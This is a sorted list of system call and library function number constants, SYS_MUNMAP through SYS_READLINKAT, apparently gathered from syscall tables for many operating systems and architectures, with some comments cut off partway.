SYS_MUNMAP                   = 73  // { int munmap(void 
SYS_MUNMAP                  = 11
SYS_MUNMAP                  = 215
SYS_MUNMAP                  = 5011
SYS_MUNMAP                  = 73
SYS_MUNMAP                  = 91
SYS_MUNMAP                 = 73  // { int munmap(void 
SYS_MUNMAP               = 73  // { int
SYS_MUNMAP         = 73  // { int sys_munmap(void 
SYS_M_CREATE_LAYOUT                 = 0x7C9
SYS_M_DESTROY_LAYOUT                = 0x7CA
SYS_M_GETVALUES_LAYOUT              = 0x7CB
SYS_M_SETVALUES_LAYOUT              = 0x7CC
SYS_M_TRANSFORM_LAYOUT              = 0x7CD
SYS_M_WTRANSFORM_LAYOUT             = 0x7CE
SYS_NAME_TO_HANDLE_AT            = 341
SYS_NAME_TO_HANDLE_AT            = 345
SYS_NAME_TO_HANDLE_AT            = 370
SYS_NAME_TO_HANDLE_AT            = 4339
SYS_NAME_TO_HANDLE_AT       = 264
SYS_NAME_TO_HANDLE_AT       = 303
SYS_NAME_TO_HANDLE_AT       = 332
SYS_NAME_TO_HANDLE_AT       = 335
SYS_NAME_TO_HANDLE_AT       = 345
SYS_NAME_TO_HANDLE_AT       = 5298
SYS_NAN                             = 0xAA8
SYS_NAND128                         = 0xBFB
SYS_NAND32                          = 0xBF9
SYS_NAND64                          = 0xBFA
SYS_NANF                            = 0xAAA
SYS_NANL                            = 0xAAC
SYS_NANOSLEEP                    = 162
SYS_NANOSLEEP                    = 4166
SYS_NANOSLEEP                = 240 // { int nanosleep(const struct timespec 
SYS_NANOSLEEP               = 101
SYS_NANOSLEEP               = 162
SYS_NANOSLEEP               = 249
SYS_NANOSLEEP               = 35
SYS_NANOSLEEP               = 5034
SYS_NANOSLEEP              = 240 // { int nanosleep(const struct timespec 
SYS_NANOSLEEP            = 430 // { int
SYS_NANOSLEEP      = 91  // { int sys_nanosleep(const struct timespec 
SYS_NEARBYINT                       = 0xAAE
SYS_NEARBYINTD128                   = 0xBFE
SYS_NEARBYINTD32                    = 0xBFC
SYS_NEARBYINTD64                    = 0xBFD
SYS_NEARBYINTF                      = 0xAB1
SYS_NEARBYINTL                      = 0xAB4
SYS_NECP_CLIENT_ACTION             = 502
SYS_NECP_MATCH_POLICY              = 460
SYS_NECP_OPEN                      = 501
SYS_NECP_SESSION_ACTION            = 523
SYS_NECP_SESSION_OPEN              = 522
SYS_NETAGENT_TRIGGER               = 490
SYS_NET_QOS_GUIDELINE              = 525
SYS_NEWFSTATAT              = 262
SYS_NEWFSTATAT              = 291
SYS_NEWFSTATAT              = 293
SYS_NEWFSTATAT              = 5252
SYS_NEXTAFTER                       = 0x328
SYS_NEXTAFTERD128                   = 0xC01
SYS_NEXTAFTERD32                    = 0xBFF
SYS_NEXTAFTERD64                    = 0xC00
SYS_NEXTAFTERF                      = 0xAB7
SYS_NEXTAFTERL                      = 0xABA
SYS_NEXTTOWARD                      = 0xABD
SYS_NEXTTOWARDD128                  = 0xC04
SYS_NEXTTOWARDD32                   = 0xC02
SYS_NEXTTOWARDD64                   = 0xC03
SYS_NEXTTOWARDF                     = 0xAC0
SYS_NEXTTOWARDL                     = 0xAC3
SYS_NFSCLNT                        = 247
SYS_NFSSERVCTL                   = 168
SYS_NFSSERVCTL                   = 169
SYS_NFSSERVCTL                   = 4189
SYS_NFSSERVCTL              = 168
SYS_NFSSERVCTL              = 169
SYS_NFSSERVCTL              = 180
SYS_NFSSERVCTL              = 254
SYS_NFSSERVCTL              = 42
SYS_NFSSERVCTL              = 5173
SYS_NFSSVC                         = 155
SYS_NFTW                            = 0x307
SYS_NICE                            = 0x271
SYS_NICE                         = 34
SYS_NICE                         = 4034
SYS_NICE                    = 34
SYS_NLIST                           = 0x38C
SYS_NLSTAT                   = 280 // { int nlstat(char 
SYS_NL_LANGINFO                     = 0x0FC
SYS_NMOUNT                   = 378 // { int nmount(struct iovec 
SYS_NOTED       = 29
SYS_NOTIFY      = 28
SYS_NRAND48                         = 0x2E9
SYS_NSEC        = 53
SYS_NSTAT                    = 278 // { int nstat(char 
SYS_NTP_ADJTIME                    = 527
SYS_NTP_ADJTIME              = 176 // { int ntp_adjtime(struct timex 
SYS_NTP_ADJTIME            = 176 // { int ntp_adjtime(struct timex 
SYS_NTP_ADJTIME          = 176 // { int
SYS_NTP_GETTIME                    = 528
SYS_NTP_GETTIME              = 248 // { int ntp_gettime(struct ntptimeval 
SYS_NTP_GETTIME          = 448 // { int
SYS_OBREAK                   = 17  // { int obreak(char 
SYS_OBREAK                 = 17  // { int obreak(char 
SYS_OBREAK         = 17  // { int sys_obreak(char 
SYS_OLDFSTAT                     = 28
SYS_OLDFSTAT                = 28
SYS_OLDLSTAT                     = 84
SYS_OLDLSTAT                = 202
SYS_OLDLSTAT                = 84
SYS_OLDOLDUNAME                  = 59
SYS_OLDOLDUNAME             = 59
SYS_OLDSTAT                      = 18
SYS_OLDSTAT                 = 18
SYS_OLDUNAME                     = 109
SYS_OLDUNAME                = 109
SYS_OPEN                            = 0x1AC
SYS_OPEN                           = 5
SYS_OPEN                         = 4005
SYS_OPEN                         = 5
SYS_OPEN                     = 5   // { int open(char 
SYS_OPEN                    = 2
SYS_OPEN                    = 5
SYS_OPEN                    = 5002
SYS_OPEN                 = 5   // { int
SYS_OPEN           = 5   // { int sys_open(const char 
SYS_OPEN        = 14
SYS_OPEN  = 5 // { int open(char 
SYS_OPENAT                         = 463
SYS_OPENAT                       = 286
SYS_OPENAT                       = 295
SYS_OPENAT                       = 322
SYS_OPENAT                       = 4288
SYS_OPENAT                  = 257
SYS_OPENAT                  = 284
SYS_OPENAT                  = 286
SYS_OPENAT                  = 288
SYS_OPENAT                  = 5247
SYS_OPENAT                  = 56
SYS_OPENAT               = 468 // { int
SYS_OPENAT2                      = 437
SYS_OPENAT2                      = 4437
SYS_OPENAT2                 = 437
SYS_OPENAT2                 = 5437
SYS_OPENAT_NOCANCEL                = 464
SYS_OPENBSD_POLL             = 252 // { int openbsd_poll(struct pollfd 
SYS_OPENBSD_POLL           = 252 // { int openbsd_poll(struct pollfd 
SYS_OPENBYID_NP                    = 479
SYS_OPENDIR                         = 0x1AD
SYS_OPENLOG                         = 0x372
SYS_OPEN_BY_HANDLE_AT            = 342
SYS_OPEN_BY_HANDLE_AT            = 346
SYS_OPEN_BY_HANDLE_AT            = 371
SYS_OPEN_BY_HANDLE_AT            = 4340
SYS_OPEN_BY_HANDLE_AT       = 265
SYS_OPEN_BY_HANDLE_AT       = 304
SYS_OPEN_BY_HANDLE_AT       = 333
SYS_OPEN_BY_HANDLE_AT       = 336
SYS_OPEN_BY_HANDLE_AT       = 346
SYS_OPEN_BY_HANDLE_AT       = 5299
SYS_OPEN_DPROTECTED_NP             = 216
SYS_OPEN_EXTENDED                  = 277
SYS_OPEN_NOCANCEL                  = 398
SYS_OPEN_TREE                    = 428
SYS_OPEN_TREE                    = 4428
SYS_OPEN_TREE               = 428
SYS_OPEN_TREE               = 5428
SYS_OSEEK       = 16
SYS_OS_FAULT_WITH_PAYLOAD          = 529
SYS_OVADVISE                 = 72  // { int ovadvise(int anom)
SYS_PACCEPT              = 456 // { int
SYS_PATHCONF                        = 0x1AE
SYS_PATHCONF                       = 191
SYS_PATHCONF                 = 191 // { int pathconf(char 
SYS_PATHCONF               = 191 // { int pathconf(char 
SYS_PATHCONF             = 191 // { long
SYS_PATHCONF       = 191 // { long sys_pathconf(const char 
SYS_PAUSE                           = 0x1AF
SYS_PAUSE                        = 29
SYS_PAUSE                        = 4029
SYS_PAUSE                   = 29
SYS_PAUSE                   = 34
SYS_PAUSE                   = 5033
SYS_PCICONFIG_IOBASE             = 200
SYS_PCICONFIG_IOBASE             = 271
SYS_PCICONFIG_IOBASE        = 200
SYS_PCICONFIG_READ               = 198
SYS_PCICONFIG_READ               = 272
SYS_PCICONFIG_READ          = 148
SYS_PCICONFIG_READ          = 198
SYS_PCICONFIG_WRITE              = 199
SYS_PCICONFIG_WRITE              = 273
SYS_PCICONFIG_WRITE         = 149
SYS_PCICONFIG_WRITE         = 199
SYS_PCLOSE                          = 0x2D2
SYS_PDFORK                   = 518 // { int pdfork(int 
SYS_PEELOFF                        = 449
SYS_PERFCTR                 = 18
SYS_PERF_EVENT_OPEN              = 319
SYS_PERF_EVENT_OPEN              = 336
SYS_PERF_EVENT_OPEN              = 364
SYS_PERF_EVENT_OPEN              = 4333
SYS_PERF_EVENT_OPEN         = 241
SYS_PERF_EVENT_OPEN         = 298
SYS_PERF_EVENT_OPEN         = 319
SYS_PERF_EVENT_OPEN         = 327
SYS_PERF_EVENT_OPEN         = 331
SYS_PERF_EVENT_OPEN         = 5292
SYS_PERROR                          = 0x04F
SYS_PERROR_UNLOCKED                 = 0xCBD
SYS_PERSONA                        = 494
SYS_PERSONALITY                  = 136
SYS_PERSONALITY                  = 4136
SYS_PERSONALITY             = 135
SYS_PERSONALITY             = 136
SYS_PERSONALITY             = 191
SYS_PERSONALITY             = 5132
SYS_PERSONALITY             = 92
SYS_PIDFD_GETFD                  = 438
SYS_PIDFD_GETFD                  = 4438
SYS_PIDFD_GETFD             = 438
SYS_PIDFD_GETFD             = 5438
SYS_PIDFD_OPEN                   = 434
SYS_PIDFD_OPEN                   = 4434
SYS_PIDFD_OPEN              = 434
SYS_PIDFD_OPEN              = 5434
SYS_PIDFD_SEND_SIGNAL            = 424
SYS_PIDFD_SEND_SIGNAL            = 4424
SYS_PIDFD_SEND_SIGNAL       = 424
SYS_PIDFD_SEND_SIGNAL       = 5424
SYS_PID_HIBERNATE                  = 435
SYS_PID_RESUME                     = 434
SYS_PID_SHUTDOWN_SOCKETS           = 436
SYS_PID_SUSPEND                    = 433
SYS_PIPE                            = 0x1B0
SYS_PIPE                           = 42
SYS_PIPE                         = 4042
SYS_PIPE                         = 42
SYS_PIPE                     = 42  // { int pipe(void)
SYS_PIPE                    = 22
SYS_PIPE                    = 42
SYS_PIPE                    = 5021
SYS_PIPE                   = 42  // { int pipe(void)
SYS_PIPE                 = 42  // { int
SYS_PIPE           = 263 // { int sys_pipe(int 
SYS_PIPE        = 21
SYS_PIPE2                        = 317
SYS_PIPE2                        = 331
SYS_PIPE2                        = 359
SYS_PIPE2                        = 4328
SYS_PIPE2                    = 542 // { int pipe2(int 
SYS_PIPE2                   = 293
SYS_PIPE2                   = 317
SYS_PIPE2                   = 321
SYS_PIPE2                   = 325
SYS_PIPE2                   = 5287
SYS_PIPE2                   = 59
SYS_PIPE2                  = 538 // { int pipe2(int 
SYS_PIPE2                = 453 // { int
SYS_PIPE2          = 101 // { int sys_pipe2(int 
SYS_PIVOT_ROOT                   = 203
SYS_PIVOT_ROOT                   = 217
SYS_PIVOT_ROOT                   = 218
SYS_PIVOT_ROOT                   = 4216
SYS_PIVOT_ROOT              = 146
SYS_PIVOT_ROOT              = 155
SYS_PIVOT_ROOT              = 203
SYS_PIVOT_ROOT              = 217
SYS_PIVOT_ROOT              = 41
SYS_PIVOT_ROOT              = 5151
SYS_PKEY_ALLOC                   = 381
SYS_PKEY_ALLOC                   = 384
SYS_PKEY_ALLOC                   = 395
SYS_PKEY_ALLOC                   = 4364
SYS_PKEY_ALLOC              = 289
SYS_PKEY_ALLOC              = 330
SYS_PKEY_ALLOC              = 363
SYS_PKEY_ALLOC              = 384
SYS_PKEY_ALLOC              = 385
SYS_PKEY_ALLOC              = 5324
SYS_PKEY_FREE                    = 382
SYS_PKEY_FREE                    = 385
SYS_PKEY_FREE                    = 396
SYS_PKEY_FREE                    = 4365
SYS_PKEY_FREE               = 290
SYS_PKEY_FREE               = 331
SYS_PKEY_FREE               = 364
SYS_PKEY_FREE               = 385
SYS_PKEY_FREE               = 386
SYS_PKEY_FREE               = 5325
SYS_PKEY_MPROTECT                = 380
SYS_PKEY_MPROTECT                = 386
SYS_PKEY_MPROTECT                = 394
SYS_PKEY_MPROTECT                = 4363
SYS_PKEY_MPROTECT           = 288
SYS_PKEY_MPROTECT           = 329
SYS_PKEY_MPROTECT           = 362
SYS_PKEY_MPROTECT           = 384
SYS_PKEY_MPROTECT           = 386
SYS_PKEY_MPROTECT           = 5323
SYS_PLEDGE         = 108 // { int sys_pledge(const char 
SYS_PMC_CONTROL          = 342 // { int
SYS_PMC_GET_INFO         = 341 // { int
SYS_POLL                            = 0x380
SYS_POLL                           = 230
SYS_POLL                         = 167
SYS_POLL                         = 168
SYS_POLL                         = 4188
SYS_POLL                     = 209 // { int poll(struct pollfd 
SYS_POLL                    = 153
SYS_POLL                    = 167
SYS_POLL                    = 168
SYS_POLL                    = 5007
SYS_POLL                    = 7
SYS_POLL                   = 209 // { int poll(struct pollfd 
SYS_POLL                 = 209 // { int
SYS_POLL           = 252 // { int sys_poll(struct pollfd 
SYS_POLLTS               = 437 // { int
SYS_POLL_NOCANCEL                  = 417
SYS_POPEN                           = 0x2D1
SYS_POSIX_FADVISE        = 416 // { int
SYS_POSIX_FALLOCATE                 = 0xCE8
SYS_POSIX_MEMALIGN                  = 0xCE9
SYS_POSIX_OPENPT                    = 0xC66
SYS_POSIX_OPENPT             = 504 // { int posix_openpt(int flags)
SYS_POSIX_SPAWN                    = 244
SYS_POSIX_SPAWN          = 474 // { int
SYS_POW                             = 0x020
SYS_POWD128                         = 0xC07
SYS_POWD32                          = 0xC05
SYS_POWD64                          = 0xC06
SYS_POWF                            = 0x649
SYS_POWL                            = 0x64A
SYS_PPOLL                        = 281
SYS_PPOLL                        = 309
SYS_PPOLL                        = 336
SYS_PPOLL                        = 4302
SYS_PPOLL                    = 545 // { int ppoll(struct pollfd 
SYS_PPOLL                   = 271
SYS_PPOLL                   = 281
SYS_PPOLL                   = 298
SYS_PPOLL                   = 302
SYS_PPOLL                   = 5261
SYS_PPOLL                   = 73
SYS_PPOLL                  = 543 // { int ppoll(struct pollfd 
SYS_PPOLL          = 109 // { int sys_ppoll(struct pollfd 
SYS_PPOLL_TIME64                 = 414
SYS_PPOLL_TIME64                 = 4414
SYS_PRCTL                        = 171
SYS_PRCTL                        = 172
SYS_PRCTL                        = 4192
SYS_PRCTL                   = 147
SYS_PRCTL                   = 157
SYS_PRCTL                   = 167
SYS_PRCTL                   = 171
SYS_PRCTL                   = 172
SYS_PRCTL                   = 5153
SYS_PREAD                           = 0x7C7
SYS_PREAD                          = 153
SYS_PREAD                = 173 // { ssize_t
SYS_PREAD       = 50
SYS_PREAD64                      = 179
SYS_PREAD64                      = 180
SYS_PREAD64                      = 4200
SYS_PREAD64                 = 17
SYS_PREAD64                 = 179
SYS_PREAD64                 = 180
SYS_PREAD64                 = 5016
SYS_PREAD64                 = 67
SYS_PREADV                       = 320
SYS_PREADV                       = 333
SYS_PREADV                       = 361
SYS_PREADV                       = 4330
SYS_PREADV                  = 295
SYS_PREADV                  = 320
SYS_PREADV                  = 324
SYS_PREADV                  = 328
SYS_PREADV                  = 5289
SYS_PREADV                  = 69
SYS_PREADV               = 289 // { ssize_t
SYS_PREADV2                      = 378
SYS_PREADV2                      = 380
SYS_PREADV2                      = 392
SYS_PREADV2                      = 4361
SYS_PREADV2                 = 286
SYS_PREADV2                 = 327
SYS_PREADV2                 = 358
SYS_PREADV2                 = 376
SYS_PREADV2                 = 380
SYS_PREADV2                 = 5321
SYS_PREAD_NOCANCEL                 = 414
SYS_PRINTF                          = 0x06F
SYS_PRINTF_UNLOCKED                 = 0xCBE
SYS_PRLIMIT64                    = 325
SYS_PRLIMIT64                    = 340
SYS_PRLIMIT64                    = 369
SYS_PRLIMIT64                    = 4338
SYS_PRLIMIT64               = 261
SYS_PRLIMIT64               = 302
SYS_PRLIMIT64               = 325
SYS_PRLIMIT64               = 331
SYS_PRLIMIT64               = 334
SYS_PRLIMIT64               = 5297
SYS_PROCESS_MADVISE              = 440
SYS_PROCESS_MADVISE              = 4440
SYS_PROCESS_MADVISE         = 440
SYS_PROCESS_MADVISE         = 5440
SYS_PROCESS_MRELEASE             = 4448
SYS_PROCESS_MRELEASE             = 448
SYS_PROCESS_MRELEASE        = 448
SYS_PROCESS_MRELEASE        = 5448
SYS_PROCESS_POLICY                 = 323
SYS_PROCESS_VM_READV             = 347
SYS_PROCESS_VM_READV             = 351
SYS_PROCESS_VM_READV             = 376
SYS_PROCESS_VM_READV             = 4345
SYS_PROCESS_VM_READV        = 270
SYS_PROCESS_VM_READV        = 310
SYS_PROCESS_VM_READV        = 338
SYS_PROCESS_VM_READV        = 340
SYS_PROCESS_VM_READV        = 351
SYS_PROCESS_VM_READV        = 5304
SYS_PROCESS_VM_WRITEV            = 348
SYS_PROCESS_VM_WRITEV            = 352
SYS_PROCESS_VM_WRITEV            = 377
SYS_PROCESS_VM_WRITEV            = 4346
SYS_PROCESS_VM_WRITEV       = 271
SYS_PROCESS_VM_WRITEV       = 311
SYS_PROCESS_VM_WRITEV       = 339
SYS_PROCESS_VM_WRITEV       = 341
SYS_PROCESS_VM_WRITEV       = 352
SYS_PROCESS_VM_WRITEV       = 5305
SYS_PROC_INFO                      = 336
SYS_PROC_RLIMIT_CONTROL            = 446
SYS_PROC_TRACE_LOG                 = 477
SYS_PROC_UUID_POLICY               = 452
SYS_PROF                         = 4044
SYS_PROF                         = 44
SYS_PROF                    = 44
SYS_PROFIL                       = 4098
SYS_PROFIL                       = 98
SYS_PROFIL                  = 98
SYS_PROFIL               = 44  // { int
SYS_PSELECT                         = 0xC67
SYS_PSELECT                        = 394
SYS_PSELECT              = 436 // { int
SYS_PSELECT6                     = 280
SYS_PSELECT6                     = 308
SYS_PSELECT6                     = 335
SYS_PSELECT6                     = 4301
SYS_PSELECT6                = 270
SYS_PSELECT6                = 280
SYS_PSELECT6                = 297
SYS_PSELECT6                = 301
SYS_PSELECT6                = 5260
SYS_PSELECT6                = 72
SYS_PSELECT6_TIME64              = 413
SYS_PSELECT6_TIME64              = 4413
SYS_PSELECT_NOCANCEL               = 395
SYS_PSET_ASSIGN          = 414 // { int
SYS_PSET_CREATE          = 412 // { int
SYS_PSET_DESTROY         = 413 // { int
SYS_PSYNCH_CVBROAD                 = 303
SYS_PSYNCH_CVCLRPREPOST            = 312
SYS_PSYNCH_CVSIGNAL                = 304
SYS_PSYNCH_CVWAIT                  = 305
SYS_PSYNCH_MUTEXDROP               = 302
SYS_PSYNCH_MUTEXWAIT               = 301
SYS_PSYNCH_RW_DOWNGRADE            = 299
SYS_PSYNCH_RW_LONGRDLOCK           = 297
SYS_PSYNCH_RW_RDLOCK               = 306
SYS_PSYNCH_RW_UNLOCK               = 308
SYS_PSYNCH_RW_UNLOCK2              = 309
SYS_PSYNCH_RW_UPGRADE              = 300
SYS_PSYNCH_RW_WRLOCK               = 307
SYS_PSYNCH_RW_YIELDWRLOCK          = 298
SYS_PTHREAD_ATFORK                  = 0x5ED
SYS_PTHREAD_ATTR_DESTROY            = 0x1E7
SYS_PTHREAD_ATTR_GETDETACHSTATE     = 0x1EB
SYS_PTHREAD_ATTR_GETDETACHSTATE_U98 = 0x5FB
SYS_PTHREAD_ATTR_GETGUARDSIZE       = 0x5EE
SYS_PTHREAD_ATTR_GETSCHEDPARAM      = 0x5F9
SYS_PTHREAD_ATTR_GETSTACK           = 0xB3E
SYS_PTHREAD_ATTR_GETSTACKADDR       = 0x5EF
SYS_PTHREAD_ATTR_GETSTACKSIZE       = 0x1E9
SYS_PTHREAD_ATTR_GETSYNCTYPE_NP     = 0x386
SYS_PTHREAD_ATTR_GETWEIGHT_NP       = 0x1ED
SYS_PTHREAD_ATTR_INIT               = 0x1E6
SYS_PTHREAD_ATTR_SETDETACHSTATE     = 0x1EA
SYS_PTHREAD_ATTR_SETDETACHSTATE_U98 = 0x5FC
SYS_PTHREAD_ATTR_SETGUARDSIZE       = 0x5F0
SYS_PTHREAD_ATTR_SETSCHEDPARAM      = 0x5FA
SYS_PTHREAD_ATTR_SETSTACK           = 0xB3F
SYS_PTHREAD_ATTR_SETSTACKADDR       = 0x5F1
SYS_PTHREAD_ATTR_SETSTACKSIZE       = 0x1E8
SYS_PTHREAD_ATTR_SETSYNCTYPE_NP     = 0x385
SYS_PTHREAD_ATTR_SETWEIGHT_NP       = 0x1EC
SYS_PTHREAD_CANCEL                  = 0x1EE
SYS_PTHREAD_CLEANUP_POP             = 0x1F0
SYS_PTHREAD_CLEANUP_PUSH            = 0x1EF
SYS_PTHREAD_CONDATTR_DESTROY        = 0x1F2
SYS_PTHREAD_CONDATTR_GETKIND_NP     = 0x214
SYS_PTHREAD_CONDATTR_GETPSHARED     = 0x5F2
SYS_PTHREAD_CONDATTR_INIT           = 0x1F1
SYS_PTHREAD_CONDATTR_SETKIND_NP     = 0x213
SYS_PTHREAD_CONDATTR_SETPSHARED     = 0x5F3
SYS_PTHREAD_COND_BROADCAST          = 0x1F6
SYS_PTHREAD_COND_DESTROY            = 0x1F4
SYS_PTHREAD_COND_INIT               = 0x1F3
SYS_PTHREAD_COND_SIGNAL             = 0x1F5
SYS_PTHREAD_COND_TIMEDWAIT          = 0x1F8
SYS_PTHREAD_COND_WAIT               = 0x1F7
SYS_PTHREAD_CREATE                  = 0x1F9
SYS_PTHREAD_DETACH                  = 0x1FA
SYS_PTHREAD_DETACH_U98              = 0x5FD
SYS_PTHREAD_EQUAL                   = 0x1FB
SYS_PTHREAD_EXIT                    = 0x1E4
SYS_PTHREAD_GETCONCURRENCY          = 0x5F4
SYS_PTHREAD_GETSPECIFIC             = 0x1FC
SYS_PTHREAD_GETSPECIFIC_D8_NP       = 0x434
SYS_PTHREAD_GETSPECIFIC_U98         = 0x5FE
SYS_PTHREAD_JOIN                    = 0x1FD
SYS_PTHREAD_JOIN_D4_NP              = 0x212
SYS_PTHREAD_KEY_CREATE              = 0x1FE
SYS_PTHREAD_KEY_DELETE              = 0x5F5
SYS_PTHREAD_KILL                    = 0x1E5
SYS_PTHREAD_MUTEXATTR_DESTROY       = 0x200
SYS_PTHREAD_MUTEXATTR_GETKIND_NP    = 0x202
SYS_PTHREAD_MUTEXATTR_GETPSHARED    = 0x50A
SYS_PTHREAD_MUTEXATTR_GETTYPE       = 0x519
SYS_PTHREAD_MUTEXATTR_INIT          = 0x1FF
SYS_PTHREAD_MUTEXATTR_SETKIND_NP    = 0x201
SYS_PTHREAD_MUTEXATTR_SETPSHARED    = 0x50B
SYS_PTHREAD_MUTEXATTR_SETTYPE       = 0x518
SYS_PTHREAD_MUTEX_DESTROY           = 0x204
SYS_PTHREAD_MUTEX_INIT              = 0x203
SYS_PTHREAD_MUTEX_INIT2             = 0x842
SYS_PTHREAD_MUTEX_LOCK              = 0x205
SYS_PTHREAD_MUTEX_TRYLOCK           = 0x206
SYS_PTHREAD_MUTEX_UNLOCK            = 0x207
SYS_PTHREAD_ONCE                    = 0x209
SYS_PTHREAD_RWLOCKATTR_DESTROY      = 0x516
SYS_PTHREAD_RWLOCKATTR_GETPSHARED   = 0x513
SYS_PTHREAD_RWLOCKATTR_INIT         = 0x515
SYS_PTHREAD_RWLOCKATTR_SETPSHARED   = 0x514
SYS_PTHREAD_RWLOCK_DESTROY          = 0x50C
SYS_PTHREAD_RWLOCK_INIT             = 0x50D
SYS_PTHREAD_RWLOCK_RDLOCK           = 0x50E
SYS_PTHREAD_RWLOCK_TRYRDLOCK        = 0x50F
SYS_PTHREAD_RWLOCK_TRYWRLOCK        = 0x510
SYS_PTHREAD_RWLOCK_UNLOCK           = 0x511
SYS_PTHREAD_RWLOCK_WRLOCK           = 0x512
SYS_PTHREAD_SECURITY_APPLID_NP      = 0xCE4
SYS_PTHREAD_SECURITY_NP             = 0x391
SYS_PTHREAD_SELF                    = 0x20A
SYS_PTHREAD_SETCANCELSTATE          = 0x5FF
SYS_PTHREAD_SETCANCELTYPE           = 0x600
SYS_PTHREAD_SETCONCURRENCY          = 0x5F6
SYS_PTHREAD_SETINTR                 = 0x20B
SYS_PTHREAD_SETINTRTYPE             = 0x20C
SYS_PTHREAD_SETSPECIFIC             = 0x20D
SYS_PTHREAD_SET_LIMIT_NP            = 0x387
SYS_PTHREAD_SIGMASK                 = 0x5F7
SYS_PTHREAD_TAG_NP                  = 0x481
SYS_PTHREAD_TESTCANCEL              = 0x601
SYS_PTHREAD_TESTINTR                = 0x20E
SYS_PTHREAD_YIELD                   = 0x20F
SYS_PTRACE                         = 26
SYS_PTRACE                       = 26
SYS_PTRACE                       = 4026
SYS_PTRACE                  = 101
SYS_PTRACE                  = 117
SYS_PTRACE                  = 26
SYS_PTRACE                  = 5099
SYS_PTRACE               = 26  // { int
SYS_PTSNAME                         = 0x375
SYS_PUTC                            = 0x07D
SYS_PUTCHAR                         = 0x07A
SYS_PUTCHAR_UNLOCKED                = 0x8D9
SYS_PUTC_UNLOCKED                   = 0x8D8
SYS_PUTENV                          = 0x26A
SYS_PUTMSG                          = 0x42C
SYS_PUTPMSG                         = 0x42D
SYS_PUTPMSG                      = 188
SYS_PUTPMSG                      = 189
SYS_PUTPMSG                      = 4209
SYS_PUTPMSG                 = 182
SYS_PUTPMSG                 = 188
SYS_PUTPMSG                 = 189
SYS_PUTPMSG                 = 5175
SYS_PUTS                            = 0x07F
SYS_PUTS_UNLOCKED                   = 0xC7F
SYS_PUTUTXLINE                      = 0x2E4
SYS_PUTW                            = 0x31C
SYS_PUTWC                           = 0x142
SYS_PUTWCHAR                        = 0x143
SYS_PUTWCHAR_UNLOCKED               = 0xCC0
SYS_PUTWC_UNLOCKED                  = 0xCBF
SYS_PWRITE                          = 0x7C8
SYS_PWRITE                         = 154
SYS_PWRITE               = 174 // { ssize_t
SYS_PWRITE      = 51
SYS_PWRITE64                     = 180
SYS_PWRITE64                     = 181
SYS_PWRITE64                     = 4201
SYS_PWRITE64                = 18
SYS_PWRITE64                = 180
SYS_PWRITE64                = 181
SYS_PWRITE64                = 5017
SYS_PWRITE64                = 68
SYS_PWRITEV                      = 321
SYS_PWRITEV                      = 334
SYS_PWRITEV                      = 362
SYS_PWRITEV                      = 4331
SYS_PWRITEV                 = 296
SYS_PWRITEV                 = 321
SYS_PWRITEV                 = 325
SYS_PWRITEV                 = 329
SYS_PWRITEV                 = 5290
SYS_PWRITEV                 = 70
SYS_PWRITEV              = 290 // { ssize_t
SYS_PWRITEV2                     = 379
SYS_PWRITEV2                     = 381
SYS_PWRITEV2                     = 393
SYS_PWRITEV2                     = 4362
SYS_PWRITEV2                = 287
SYS_PWRITEV2                = 328
SYS_PWRITEV2                = 359
SYS_PWRITEV2                = 377
SYS_PWRITEV2                = 381
SYS_PWRITEV2                = 5322
SYS_PWRITE_NOCANCEL                = 415
SYS_QSORT                           = 0x249
SYS_QUANTEXPD128                    = 0xD46
SYS_QUANTEXPD32                     = 0xD44
SYS_QUANTEXPD64                     = 0xD45
SYS_QUANTIZED128                    = 0xC0A
SYS_QUANTIZED32                     = 0xC08
SYS_QUANTIZED64                     = 0xC09
SYS_QUERYENC                        = 0x5AD
SYS_QUERYMET                        = 0x4BA
SYS_QUERYMETRICS                    = 0x4BA
SYS_QUERYSCH                        = 0x4BB
SYS_QUERYSCHENV                     = 0x4BB
SYS_QUERYWORKUNITCLASSIFICATION     = 0x5AD
SYS_QUERY_MODULE                 = 166
SYS_QUERY_MODULE                 = 167
SYS_QUERY_MODULE                 = 4187
SYS_QUERY_MODULE            = 166
SYS_QUERY_MODULE            = 167
SYS_QUERY_MODULE            = 178
SYS_QUERY_MODULE            = 184
SYS_QUERY_MODULE            = 5171
SYS_QUOTACTL                       = 165
SYS_QUOTACTL                     = 131
SYS_QUOTACTL                     = 4131
SYS_QUOTACTL                 = 148 // { int quotactl(char 
SYS_QUOTACTL                = 131
SYS_QUOTACTL                = 165
SYS_QUOTACTL                = 179
SYS_QUOTACTL                = 5172
SYS_QUOTACTL                = 60
SYS_QUOTACTL               = 148 // { int quotactl(char 
SYS_QUOTACTL       = 148 // { int sys_quotactl(const char 
SYS_QUOTACTL_FD                  = 443
SYS_QUOTACTL_FD                  = 4443
SYS_QUOTACTL_FD             = 443
SYS_QUOTACTL_FD             = 5443
SYS_RAISE                           = 0x05E
SYS_RAND                            = 0x052
SYS_RANDOM                          = 0x2C4
SYS_RAND_R                          = 0x5E4
SYS_RASCTL               = 343 // { int
SYS_RCTL_ADD_RULE            = 528 // { int rctl_add_rule(const void 
SYS_RCTL_GET_LIMITS          = 527 // { int rctl_get_limits(const void 
SYS_RCTL_GET_RACCT           = 525 // { int rctl_get_racct(const void 
SYS_RCTL_GET_RULES           = 526 // { int rctl_get_rules(const void 
SYS_RCTL_REMOVE_RULE         = 529 // { int rctl_remove_rule(const void 
SYS_READ                            = 0x1B2
SYS_READ                           = 3
SYS_READ                         = 3
SYS_READ                         = 4003
SYS_READ                    = 0
SYS_READ                    = 3
SYS_READ                    = 5000
SYS_READ                    = 63
SYS_READ                 = 3   // { ssize_t
SYS_READAHEAD                    = 191
SYS_READAHEAD                    = 225
SYS_READAHEAD                    = 4223
SYS_READAHEAD               = 187
SYS_READAHEAD               = 191
SYS_READAHEAD               = 205
SYS_READAHEAD               = 213
SYS_READAHEAD               = 222
SYS_READAHEAD               = 5179
SYS_READDIR                         = 0x1B3
SYS_READDIR                      = 4089
SYS_READDIR                      = 89
SYS_READDIR                 = 204
SYS_READDIR                 = 89
SYS_READDIR_R                       = 0x5E6
SYS_READLINK                        = 0x1B4
SYS_READLINK                       = 58
SYS_READLINK                     = 4085
SYS_READLINK                     = 85
SYS_READLINK                 = 58  // { ssize_t readlink(char 
SYS_READLINK                = 5087
SYS_READLINK                = 58
SYS_READLINK                = 85
SYS_READLINK                = 89
SYS_READLINK               = 58  // { int readlink(char 
SYS_READLINK             = 58  // { ssize_t
SYS_READLINK       = 58  // { ssize_t sys_readlink(const char 
SYS_READLINKAT                     = 473
SYS_READLINKAT                   = 296
SYS_READLINKAT                   = 305
SYS_READLINKAT                   = 332
